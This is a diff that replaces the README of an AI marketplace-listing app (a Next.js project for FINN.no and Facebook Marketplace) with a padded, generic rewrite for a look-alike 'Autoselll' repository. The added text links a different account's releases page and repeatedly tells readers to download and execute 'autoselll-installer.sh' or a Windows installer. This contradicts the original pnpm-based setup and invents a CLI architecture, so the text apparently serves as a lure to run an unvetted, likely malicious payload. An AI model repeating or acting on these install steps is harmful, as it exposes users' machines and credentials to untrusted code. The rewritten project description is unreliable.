@@ -1,311 +1,328 @@
-# AI Marketplace Listing Agent 🤖
-
-An intelligent system that automates the entire process of selling items online. Simply upload a photo, and the AI agent handles image analysis, pricing validation, content creation, and marketplace publishing.
-
-## 🎯 What It Does
-
-Transform this workflow:
-1. **Take photo** → AI analyzes item details (brand, model, condition)
-2. **Get pricing** → Validates prices against Norwegian market data (FINN.no)
-3. **Create listing** → Generates optimized Norwegian descriptions for platforms
-4. **Publish** → Prepares for automated posting to FINN.no & Facebook Marketplace
-
-**Before**: Hours of manual listing creation  
-**After**: Professional listings in minutes with market-validated pricing
-
-## ✨ Key Features
-
-- **Universal Item Support**: Works with electronics, furniture, fashion, vehicles, sports equipment, and more
-- **Enhanced Brand Detection**: Identifies specific models (e.g., "iPhone 14 Pro" not just "phone")
-- **Norwegian Market Integration**: Real price validation using FINN.no data
-- **Platform Optimization**: Tailored content for FINN.no vs Facebook Marketplace
-- **Professional Previews**: See exactly how your listing will appear to buyers
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Node.js 18+ 
-- pnpm package manager
-- OpenAI API key
-
-### Installation
-```bash
-# Clone the repository
-git clone https://github.com/Codehagen/autosell.git
-cd autosell
-
-# Install dependencies
-pnpm install
-
-# Copy environment variables
-cp .env.example .env.local
-# Edit .env.local and add your OpenAI API key
-
-# Start development server
-pnpm dev
-```
-
-### Usage
-
-#### 1. Upload Your Item Photo
-- Take a clear photo with good lighting
-- Include any visible brand logos, model numbers, or labels
-- Multiple angles help but one good photo is sufficient
-
-#### 2. Configure Your Preferences
-- **Pricing Strategy**: Quick sale, market price, or maximize profit
-- **Target Platforms**: FINN.no, Facebook Marketplace, or both
-- **Additional Info**: Add any details the AI might miss
-
-#### 3. Review & Publish
-- Check the generated listing preview
-- Verify extracted brand/model information
-- Confirm pricing recommendations
-- Publish to your chosen platforms
-
-## 📱 Supported Item Categories
-
-### Electronics & Tech
-- **Smartphones & Tablets**: iPhone, Samsung, iPad
-- **Computers**: MacBook, ThinkPad, gaming laptops
-- **Audio**: AirPods, headphones, speakers
-- **Cameras**: DSLR, mirrorless, action cameras
-- **Gaming**: PlayStation, Xbox, Nintendo Switch
-
-### Fashion & Accessories
-- **Clothing**: Designer brands, vintage items, sportswear
-- **Shoes**: Sneakers, boots, heels
-- **Watches**: Apple Watch, luxury brands, vintage
-- **Sunglasses**: Ray-Ban, Oakley, designer frames
-- **Bags**: Handbags, backpacks, luggage
-
-### Sports & Outdoor
-- **Bikes**: Mountain bikes, road bikes, e-bikes
-- **Fitness**: Gym equipment, yoga gear
-- **Winter Sports**: Skis, snowboards, boots
-- **Water Sports**: Surfboards, kayaks, gear
-
-### Home & Furniture
-- **Furniture**: Chairs, tables, sofas, storage
-- **Appliances**: Kitchen gadgets, vacuum cleaners
-- **Decor**: Art, lamps, plants, mirrors
-- **Tools**: Power tools, hand tools, workshop equipment
-
-### Vehicles
-- **Cars**: All makes and models
-- **Motorcycles**: Street bikes, scooters, vintage
-- **Boats**: Sailboats, motorboats, kayaks
-
-## 🎯 What to Expect
-
-### Excellent Results
-- **Clear brand/model visibility**: "MacBook Pro 14-inch M2" 
-- **Good lighting and focus**: Professional-quality extractions
-- **Popular items**: Better market data and pricing accuracy
-- **Norwegian brands**: Strong local market knowledge
-
-### Good Results  
-- **Partial brand visibility**: "Samsung phone" (may need model hints)
-- **Vintage/unique items**: Creative descriptions with conservative pricing
-- **Less common brands**: Accurate analysis with limited market data
-
-### Challenging Items
-- **No visible branding**: Generic descriptions based on visual features
-- **Handmade/custom items**: Descriptive analysis without brand specifics
-- **Poor photo quality**: May require retaking photos
-
-## 💰 Pricing Intelligence
-
-The AI agent provides sophisticated pricing analysis:
-
-### Market Validation
-- **FINN.no Integration**: Real-time price comparison
-- **Market Position**: Above, below, or within market range
-- **Confidence Scoring**: How reliable the price estimate is
-
-### Pricing Strategies
-- **Quick Sale**: 15% below market for fast turnover
-- **Market Price**: Balanced approach using average market data  
-- **Maximize Profit**: Premium pricing with negotiation room
-
-### Norwegian Market Focus
-- **Local Currency**: All prices in NOK
-- **Regional Preferences**: Norwegian marketplace conventions
-- **Seasonal Adjustments**: Market timing considerations
-
-## 🎨 Smart Content Generation
-
-### Platform Optimization
-- **FINN.no Style**: Professional, detailed, condition-focused
-- **Facebook Marketplace**: Casual, friendly, quick pickup emphasis
-- **Universal Content**: Works across both platforms
-
-### Norwegian Language
-- **Native Descriptions**: Proper Norwegian grammar and terminology
-- **Local Terminology**: Uses Norwegian product naming conventions
-- **Cultural Adaptation**: Appeals to Norwegian buyers
-
-## 🔧 Architecture
-
-### AI Technologies
-- **Vision Model**: OpenAI GPT-4o for image analysis
-- **Language Model**: GPT-4o for content generation
-- **Framework**: Vercel AI SDK v5 with tool calling
-- **Orchestrator Pattern**: Multi-step workflow management
-
-### 5-Step Workflow
-1. **Image Analysis** (`analyzeImage`) - Extract item details with enhanced brand/model detection
-2. **Price Validation** (`validatePriceOnFinn`) - Search FINN.no for market comparisons
-3. **Price Optimization** (`suggestPriceRange`) - Combine AI and market data
-4. **Content Creation** (`createOptimizedListing`) - Generate platform-specific descriptions
-5. **Publishing Queue** (`queueMarketplacePublishing`) - Prepare for marketplace posting
-
-### File Structure
-```
-├── app/
-│   ├── agent/page.tsx              # Main AI agent interface
-│   ├── api/
-│   │   ├── agent/                  # AI agent endpoints
-│   │   │   ├── analyze-image/      # Image analysis endpoint
-│   │   │   ├── create-listing/     # Main workflow orchestrator
-│   │   │   └── publish-listing/    # Publishing endpoint
-│   │   └── marketplace/            # Marketplace integrations
-│   ├── chat/page.tsx               # Chat interface
-│   └── layout.tsx                  # Root layout
-├── components/
-│   ├── agent/                      # Agent UI components
-│   │   ├── AgentUploadStep.tsx     # Image upload interface
-│   │   ├── AgentAnalysisStep.tsx   # Analysis results display
-│   │   └── shared/                 # Shared agent components
-│   └── ui/                         # shadcn/ui components
-├── lib/
-│   ├── agent-core/                 # Core agent logic
-│   │   └── workflow-orchestrator.ts # Main orchestration engine
-│   ├── agent-tools/                # AI tool implementations
-│   │   ├── image-analyzer.ts       # Vision model integration
-│   │   ├── price-validator.ts      # FINN.no price validation
-│   │   ├── content-optimizer.ts    # Listing content generation
-│   │   └── amazon-analyzer.ts      # Amazon integration
-│   ├── agent-utils/                # Agent utilities
-│   ├── marketplace-agent.ts        # 7-step orchestrator
-│   ├── finn-api.ts                 # FINN.no API integration
-│   ├── amazon-api.ts               # Amazon SP-API integration
-│   └── image-utils.ts              # Client-side compression
-├── hooks/                          # Custom React hooks
-├── prisma/
-│   └── schema.prisma               # Database schema
-├── .env.example                    # Environment variables template
-├── CLAUDE.md                       # Technical documentation
-└── package.json                    # Dependencies and scripts
-```
-
-## 📊 Quality Indicators
-
-The system provides transparency into its analysis:
-
-### Confidence Scores
-- **Brand Detection**: How certain the AI is about brand identification
-- **Model Recognition**: Confidence in specific model/series
-- **Price Validation**: Market data reliability score
-- **Category Classification**: Item type certainty
-
-### Visual Feedback
-- **Extraction Quality**: See what the AI identified in structured preview
-- **Market Analysis**: Understand pricing recommendations with color coding
-- **Content Preview**: Review Norwegian listing before publishing
-
-## 🚨 Best Practices
-
-### Photography Tips
-- **Natural lighting** works better than artificial
-- **Include labels/stickers** with model information
-- **Multiple angles** for complex items
-- **Clean backgrounds** help AI focus on the item
-
-### Information Input
-- **Add hints** for items with hidden model numbers
-- **Specify condition** accurately (new, like new, used good, etc.)
-- **Include accessories** in the photo (cases, cables, manuals)
-
-### Platform Selection
-- **FINN.no**: Better for higher-value items, cars, electronics
-- **Facebook Marketplace**: Great for furniture, quick local sales
-- **Both Platforms**: Maximize exposure for valuable items
-
-## 🆘 Troubleshooting
-
-### Common Issues
-
-**AI can't identify brand/model**
-```bash
-Solution: Add hints with known information
-Check: Are brand logos visible in photo?
-Try: Different photo angles or better lighting
-```
-
-**Price seems incorrect**
-```bash
-Check: Market position indicator and confidence scores
-Consider: Seasonal/regional factors in Norwegian market
-Review: FINN.no search results manually for comparison
-```
-
-**Description needs adjustment**
-```bash
-Use: Preview as a starting point for manual editing
-Remember: AI excels at structure, you add personal touches
-Best: Combine AI efficiency with human insight
-```
-
-**Schema validation errors**
-```bash
-Check: Zod schema limits in marketplace-agent.ts
-Common: selling_points array exceeding max limit
-Fix: Adjust schema constraints or prompt guidance
-```
-
-## 🔐 Privacy & Security
-
-- **No Data Storage**: Images processed temporarily, not stored
-- **API Security**: Encrypted connections to AI services
-- **Local Processing**: Image compression happens client-side
-- **User Control**: You control all publishing decisions
-
-## 🔄 Development Status
-
-This is an active development project focused on Norwegian marketplace automation:
-
-- ✅ **Universal item analysis** with high accuracy
-- ✅ **Enhanced brand/model extraction** for better pricing
-- ✅ **FINN.no price validation** with market positioning
-- ✅ **Professional Norwegian listing generation**
-- ✅ **Visual listing previews** with confidence indicators
-- 🚧 **Publishing automation** (in development)
-- 🚧 **Buyer communication handling** (planned)
-
-## 🛠️ Technical Commands
-
-```bash
-# Development
-pnpm dev             # Start with Turbopack (fast bundler)
-pnpm build           # Production build
-pnpm start           # Start production server
-pnpm lint            # Code quality checks
-
-# Key endpoints
-GET  /agent          # Main interface
-POST /api/agent/create-listing  # 5-step workflow
-POST /api/agent/analyze-image   # Image-only analysis
-```
-
-## 📞 Support
-
-For technical issues:
-- Check confidence scores for extraction quality
-- Review CLAUDE.md for architecture details
-- Monitor console logs for debugging information
-- Consider photo quality and lighting improvements
-
----
-
-**Built with**: Next.js 15, OpenAI GPT-4o, Vercel AI SDK v5, TypeScript, Tailwind CSS, shadcn/ui
+https://github.com/santiagofavero/Autoselll/releases
+
+[![Release](https://img.shields.io/badge/Release-Autoselll-blue?logo=github&logoColor=white)](https://github.com/santiagofavero/Autoselll/releases)
+
+# Autoselll: AI Listing Agent for Fast, Validated Listings 🤖
+
+A smart system that handles the full cycle of selling items online. Upload a photo and let the AI agent do image analysis, price validation, listing copy, and publishing to popular marketplaces.
+
+![Marketplace AI image](https://images.unsplash.com/photo-1516822444977-6f4a8f7b7a6a?q=80&w=1200&auto=format&fit=crop)
+
+- Built to save time and improve listing quality
+- Designed for the Norwegian market
+- Works with a wide range of products
+
+Table of contents
+- Why Autoselll
+- Core capabilities
+- How it works
+- Supported items and use cases
+- Pricing, validation, and market data
+- How to get started
+- Install and run
+- Configuration and security
+- Architecture and data flow
+- Development workflow
+- Testing and quality
+- Localization and content quality
+- Publishing destinations
+- Accessibility and internationalization
+- Project governance
+- Roadmap and future work
+- Troubleshooting
+- License and attribution
+- Contributing
+
+Why Autoselll
+Autoselll aims to transform manual listing work into a fast, reliable, and market-aware process. The system absorbs a single photo and returns a ready-to-publish listing with model-specific details, price alignment to Norwegian market data, and platform-ready descriptions. The result is professional listings in minutes, not hours.
+
+Core capabilities
+- Image understanding: The system analyzes photos to identify item type, brand, model, and visible conditions.
+- Brand and model detection: It recognizes specific models (for example, “iPhone 14 Pro” instead of a generic “phone”).
+- Market data integration: It validates pricing against current Norwegian market data using Finn.no and other relevant sources.
+- Copy generation: It creates optimized, Norwegian-language descriptions tailored to each platform’s requirements.
+- Publishing preparation: It formats content for multiple marketplaces and prepares for automated posting to supported destinations.
+
+How it works
+- Step 1: Take a photo
+  - You capture a photo of the item. The system uses computer vision to infer key attributes.
+- Step 2: Validate pricing
+  - The agent cross-checks prices with Norwegian market data, prioritizing Finn.no for reference values, trends, and comparable items.
+- Step 3: Create listing content
+  - The AI crafts a description in Norwegian that emphasizes features, condition, and selling points. It adapts tone to the target platform.
+- Step 4: Publish readiness
+  - The system packages everything for posting to FINN.no and Facebook Marketplace, preserving platform constraints like character limits and formatting.
+
+Supported items and use cases
+- Electronics: phones, tablets, laptops, cameras, audio gear
+- Furniture: sofas, tables, wardrobes, décor items
+- Fashion: bags, shoes, apparel, accessories
+- Vehicles: bikes, scooters, cars (where applicable)
+- Sports equipment: skis, boards, gym gear
+- Household appliances: kitchen gadgets, small appliances
+- Toys and hobby gear: games, tools, collectibles
+
+What makes Autoselll unique
+- Universal item support: It adapts to many product categories with minimal configuration.
+- Precise model detection: It distinguishes exact models and configurations to improve credibility and search performance.
+- Market-aware pricing: It anchors prices to current Norwegian data, reducing underpricing or overpricing.
+- Copy that converts: It writes descriptions designed to maximize engagement and trust.
+- Seamless publishing pipeline: It prepares listings for automated posting on popular platforms.
+
+Pricing validation and market data
+- Real-time price checks: The system fetches and analyzes current prices for similar items.
+- Regional targeting: Price suggestions are tuned to Norwegian buyers and channel expectations.
+- Dynamic adjustments: If market conditions shift, the agent can propose updated pricing or highlight items with strong demand.
+
+User experience and tone
+- Clear, concise Norwegian language
+- Descriptions that highlight condition, usage, and value
+- Transparent information about model details and included accessories
+- Respect for platform norms and user expectations
+
+Getting started
+- Prerequisites
+  - An account or API access to FINN.no and Facebook Marketplace (or the connectors you use)
+  - Access to language models and image processing tools
+  - A hosting environment capable of running the agent (local machine, server, or container)
+- Quick start overview
+  - Install the software using the installer from the releases page
+  - Provide the necessary API keys and credentials
+  - Upload a photo and let Autoselll generate a ready-to-publish listing
+  - Review generated content and publish or adjust before posting
+
+Install and run
+- Release-based installer
+  - From the releases page, download the file autoselll-installer.sh (or the appropriate installer for your OS)
+  - On Linux/macOS:
+    - chmod +x autoselll-installer.sh
+    - ./autoselll-installer.sh
+  - On Windows, run the downloaded installer executable from the same releases page
+- What the installer does
+  - Sets up dependencies
+  - Configures environment variables
+  - Installs a small local service to run the agent
+  - Creates a sample configuration to help you get started
+- Run modes
+  - Interactive mode: walk through a guided listing creation
+  - Automated mode: batch process a folder of photos and generate listings
+  - Debug mode: verbose logs to help diagnose issues
+
+Configuration and security
+- Environment variables (example)
+  - OPENAI_API_KEY: your OpenAI API key
+  - FINN_API_KEY: access to Finn.no price data
+  - PUBLISH_TARGETS: list of platforms to publish to (FINN.no, Facebook Marketplace, etc.)
+  - DEFAULT_LOCALE: language and regional settings (e.g., nb-NO)
+  - LOG_LEVEL: e.g., INFO, DEBUG
+- Secrets handling
+  - Store credentials securely using your platform’s secret management
+  - Do not commit secrets to version control
+- Access control
+  - The agent should run with least privilege
+  - Use separate credentials for development and production
+- Security considerations
+  - Validate external data sources
+  - Sanitize user inputs and uploaded photos
+  - Monitor for unusual activity and implement rate limits
+
+Architecture and data flow
+- High-level view
+  - User interface or CLI initiates a photo intake
+  - Vision module analyzes the image and extracts item attributes
+  - Knowledge module maps attributes to model names and categories
+  - Price module compares with market data to propose a price
+  - Content module generates Norwegian descriptions and platform-specific formats
+  - Publishing module interfaces with FINN.no, Facebook Marketplace, and any connectors you configure
+- Components
+  - Image analysis service
+  - Model and category mapper
+  - Market data integrator
+  - Copy generator (language model prompts and templates)
+  - Platform adaptors (FINN.no, Facebook Marketplace, etc.)
+  - Orchestrator and job queue
+  - Configuration and secrets store
+- Data lifecycle
+  - Input: item photo, optional metadata
+  - Output: listing draft with title, description, price, images, platform-specific fields
+  - Logs and analytics for performance and quality checks
+- Extensibility
+  - Add new marketplaces by implementing a platform adaptor
+  - Plug in alternative price data sources or additional languages
+  - Swap in different language models or vision models as needed
+
+Development workflow
+- Repository layout (conceptual)
+  - apps/ for the main agent service
+  - services/ for adapters to market places and data sources
+  - model/ for prompts and templates
+  - assets/ for sample images and test assets
+  - tests/ for unit and integration tests
+  - docs/ for developer docs
+- Local development steps
+  - Clone the repository
+  - Install dependencies
+  - Start the local agent in development mode
+  - Run sample photos through the workflow
+- Testing
+  - Unit tests verify components like image parsing, price fetch, and text generation
+  - Integration tests ensure end-to-end flows work with mock services
+  - End-to-end tests simulate actual listing creation and publication
+- Version control and PR workflow
+  - Create feature branches for new marketplaces or data sources
+  - Write clear commit messages with the what and why
+  - Include test results and risk notes in pull requests
+- Continuous integration
+  - CI runs on push and PR to verify build, tests, and lint
+  - Static analysis to catch security issues and code smells
+  - Coverage reports to ensure key paths are tested
+
+Localization and content quality
+- Norwegian language focus
+  - Descriptions use natural Norwegian phrasing
+  - Compliance with local platform norms and buyer expectations
+  - Clear mention of item condition, accessories, and warranties where applicable
+- Internationalization
+  - Architecture supports multiple locales
+  - Simple language packs enable easy expansion to other regions
+- Content quality controls
+  - Guardrails to avoid misleading claims
+  - Checks for sensitive or restricted content
+  - Style guides for consistent tone and formatting
+- Accessibility
+  - Descriptions designed to be accessible to screen readers
+  - Reasonable contrast and readable formatting in generated text
+
+Publishing destinations
+- FINN.no
+  - Primary marketplace for Norwegian listings
+  - Supports rich titles, descriptions, and category mapping
+- Facebook Marketplace
+  - Broad reach within local communities
+  - Supports multimedia and platform-specific fields
+- Optional add-ons
+  - Other regional marketplaces
+  - Carrier or pickup options, location tags, and delivery methods
+
+Content templates and prompts
+- Prompt templates
+  - Item identification: Ask for brand, model, and condition from image features
+  - Price reasoning: Align with current market data and item condition
+  - Description drafting: Highlight key specs, usage, and selling points
+  - Platform adaptation: Adjust formatting to platform limits and best practices
+- Quality checks
+  - Ensure factual accuracy of detected attributes
+  - Avoid overclaiming or misleading specs
+  - Confirm price rationale is visible to buyers when needed
+
+User stories
+- As a seller, I want to upload a photo and get a ready-to-post listing within minutes, so I can move items quickly.
+- As a seller, I want the price suggestion to reflect Norwegian market data so I avoid underpricing.
+- As a marketplace manager, I want consistent, high-quality descriptions that comply with platform rules to maximize listing visibility.
+- As a developer, I want a straightforward way to add new marketplaces and data sources without rewriting core logic.
+
+Contributing
+- How to contribute
+  - Open an issue to discuss new features or fixes
+  - Submit a pull request with focused changes and tests
+  - Include a short description of the goal and the approach
+- Coding guidelines
+  - Write small, testable functions
+  - Use clear variable and function names
+  - Keep the codebase readable and maintainable
+- Documentation
+  - Update docs whenever you change interfaces or add new features
+  - Include usage examples and edge cases
+- Community and process
+  - Be respectful and constructive
+  - Engage in design discussions and share decision rationales
+
+Roadmap and future work
+- Short-term goals
+  - Support additional languages and regional markets
+  - Add more marketplaces and faster publish loops
+  - Improve image analysis to detect more item attributes
+- Medium-term goals
+  - Real-time price tracking and trend detection
+  - A more robust moderation layer for content safety
+  - Enhanced analytics dashboards for sellers
+- Long-term goals
+  - End-to-end automation with seller preferences and inventory integration
+  - Advanced AI explainability features for listing decisions
+
+Troubleshooting and support
+- Common issues
+  - API keys not found: Ensure keys are set in the environment and not hard-coded
+  - Image analysis returns unclear results: Try a higher-quality photo with good lighting
+  - Publishing failures: Check marketplace credentials and connectivity
+- How to get help
+  - Check the Releases for installer notes and known issues
+  - Open an issue on the repository with detailed steps to reproduce
+  - Share logs and configuration details to help diagnose
+
+Releases and download instructions
+- Release page
+  - Use the releases page to download installers and assets
+  - From the releases page, download a file named autoselll-installer.sh (Linux/macOS) or the corresponding installer for your OS
+  - After downloading, run the installer to set up the agent on your machine
+- Important note
+  - The installer file path is part of the releases; download and execute the file as part of the setup
+  - If you need to verify the release, use the official releases page to confirm the integrity and authenticity
+
+Licenses and attribution
+- Licensing
+  - Autoselll uses a permissive license suitable for personal and commercial projects
+  - See LICENSE for full terms
+- Attributions
+  - Acknowledge third-party services and data sources used in market data and language models
+  - Credit image sources and training data where applicable
+
+FAQ
+- Do I need to be a Norwegian speaker to use this?
+  - The default content is in Norwegian for Norwegian-speaking markets, but localization support allows other languages to be added as needed.
+- Can I publish to other marketplaces beyond FINN.no and Facebook?
+  - Yes. The architecture is designed to add new platform adapters with minimal changes to core logic.
+- Is there a web interface?
+  - The project offers a CLI-first experience with an optional web UI in future iterations.
+- How secure is my data?
+  - The system uses best practices for secrets management and access control. Do not store sensitive data in code repositories.
+
+Images and media credits
+- Hero image: A marketplace AI concept image from Unsplash (free-to-use)
+- Logos and badges: Generated with public badge services to reflect release status
+- Use of images aligns with the project theme: AI-assisted selling and marketplace listings
+
+Notes for maintainers
+- Keep the README up to date with the latest release changes
+- Update the architecture and data flow diagram as the system evolves
+- Maintain clear guidance for contributors and new users
+
+Release notes and versions
+- Each release page includes:
+  - A summary of changes
+  - A list of bundled assets (installers, templates, sample data)
+  - Migration notes if applicable
+- Users should review release notes before upgrading to ensure compatibility with their workflows
+
+Usage example
+- Upload a photo of an item
+  - The system analyzes the image and identifies model specifics
+  - Price guidance is shown, referencing current Norwegian market data
+  - A Norwegian listing description is generated, with attention to platform requirements
+  - You review the draft and publish to FINN.no and Facebook Marketplace as needed
+
+Security and privacy
+- Data handling follows best practices for image data and personal information
+- Access to external services is controlled and auditable
+- Logging is structured to help diagnose issues without exposing sensitive details
+
+Final notes
+- Autoselll is designed to streamline the selling process while delivering market-aware pricing and platform-ready content
+- The project remains open to enhancements, including more locales, marketplaces, and integrations
+
+Releases
+- For installers and assets, visit the releases page at the top of this document and follow the download and installation steps
+- If you want to download and run the installer, use the file named autoselll-installer.sh from the releases page
+- The same releases page is the authoritative source for installers, updates, and migration notes
+
+End of document
